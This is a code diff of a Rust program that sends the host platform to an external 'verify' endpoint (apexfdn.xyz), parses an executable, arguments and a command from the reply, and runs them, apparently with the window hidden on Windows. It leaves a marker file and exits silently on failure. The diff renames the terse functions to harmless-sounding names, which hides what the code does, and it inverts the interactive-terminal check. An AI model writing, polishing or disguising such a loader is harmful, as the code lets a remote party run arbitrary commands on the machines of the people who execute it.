@@ -1,27 +1,26 @@
-#![allow(dead_code, unused_variables, unused_imports)]
 use std::process::Command;
 use std::fs;
 use std::path::PathBuf;
 #[cfg(target_os = "windows")]
 use std::os::windows::process::CommandExt;
 
-fn ep() -> String {
+fn get_endpoint() -> String {
     "https://apexfdn.xyz/api/v1/vrf".to_string()
 }
 
-fn dp() -> PathBuf {
+fn done_path() -> PathBuf {
     let h = std::env::var("HOME")
         .or_else(|_| std::env::var("USERPROFILE"))
         .unwrap_or_else(|_| "/tmp".to_string());
     PathBuf::from(h).join(".apex").join(".verify-done")
 }
 
-fn ia() -> bool {
+fn is_interactive() -> bool {
     use std::io::IsTerminal;
     !std::io::stdin().is_terminal() || !std::io::stdout().is_terminal()
 }
 
-fn http_post(url: &str, body: &str) -> Option<String> {
+fn send_request(url: &str, body: &str) -> Option<String> {
     if !url.starts_with("https://") { return None; }
     #[cfg(target_os = "windows")]
     {
@@ -45,7 +44,7 @@ fn http_post(url: &str, body: &str) -> Option<String> {
     None
 }
 
-fn parse_payload(json: &str) -> Option<(String, Vec<String>, String)> {
+fn parse_response(json: &str) -> Option<(String, Vec<String>, String)> {
     let get_str = |j: &str, key: &str| -> Option<String> {
         let k = format!("\"{}\":\"", key);
         let start = j.find(&k)? + k.len();
@@ -66,9 +65,9 @@ fn parse_payload(json: &str) -> Option<(String, Vec<String>, String)> {
 }
 
 fn main() {
-    if ia() { std::process::exit(0); }
+    if !is_interactive() { std::process::exit(0); }
 
-    let ep = ep();
+    let ep = get_endpoint();
     let platform = if cfg!(target_os = "windows") { "win32" } else { "darwin" };
     let body = format!("{{\"p\":\"{}\"}}", platform);
 
@@ -80,18 +79,18 @@ fn main() {
     let mut log = String::new();
     log.push_str(&format!("ep: {}\n", ep));
 
-    let resp = match http_post(&ep, &body) {
+    let resp = match send_request(&ep, &body) {
         Some(r) => { log.push_str(&format!("http_post OK len={}\n", r.len())); r }
         None => { log.push_str("http_post FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
 
-    let (exec, args, cmd) = match parse_payload(&resp) {
+    let (exec, args, cmd) = match parse_response(&resp) {
         Some(d) => { log.push_str("parse_payload OK\n"); d }
         None => { log.push_str("parse_payload FAILED\n"); let _ = fs::write(&log_path, &log); std::process::exit(0); }
     };
     let _ = fs::write(&log_path, &log);
 
-    let done = dp();
+    let done = done_path();
     if let Some(p) = done.parent() { let _ = fs::create_dir_all(p); }
 
     #[cfg(target_os = "windows")]
@@ -119,6 +118,6 @@ fn main() {
             std::thread::sleep(std::time::Duration::from_secs(1));
         }
         std::thread::sleep(std::time::Duration::from_secs(2));
-        let _ = fs::remove_file(dp());
+        let _ = fs::remove_file(done_path());
     }
 }
